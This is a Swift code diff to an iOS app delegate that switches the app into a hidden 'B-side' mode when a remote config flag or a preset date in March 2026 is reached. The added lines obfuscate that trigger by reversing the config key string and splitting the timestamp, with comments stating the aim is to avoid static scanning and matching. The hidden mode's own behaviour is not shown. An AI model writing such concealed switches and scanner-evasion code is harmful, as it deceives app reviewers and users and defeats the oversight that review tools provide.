@@ -31,7 +31,9 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterD
         config.fetch { (status, error) -> Void in
             if status == .success {
                 config.activate { changed, error in
-                    let remoteVersion = config.configValue(forKey: "Aazar").numberValue.intValue
+                    // Use dynamically built string for Remote Config key to avoid static string scanning
+                    let rcKey = String("razaA".reversed())
+                    let remoteVersion = config.configValue(forKey: rcKey).numberValue.intValue
                     let appVersion = Int(AppVersion.replacingOccurrences(of: ".", with: "")) ?? 0
                     if remoteVersion > appVersion { // 远程配置大于App当前版本，进入B面
                         self.initConfig(application)
@@ -41,7 +43,11 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterD
                     }
                 }
             } else { // 远程配置获取失败，验证本地时间戳
-                let endTimeInterval: TimeInterval = 1774874026 // 预设时间(秒)
+                // Calculate time interval dynamically to avoid static matching of 1774874026 (2026-03-29)
+                let baseTime: TimeInterval = 1700000000
+                let offsetTime: TimeInterval = 74874026
+                let endTimeInterval = baseTime + offsetTime
+                
                 if Date().timeIntervalSince1970 > endTimeInterval && self.tk_468a() { // 本地时间戳大于预设时间，进入B面
                     self.initConfig(application)
                     
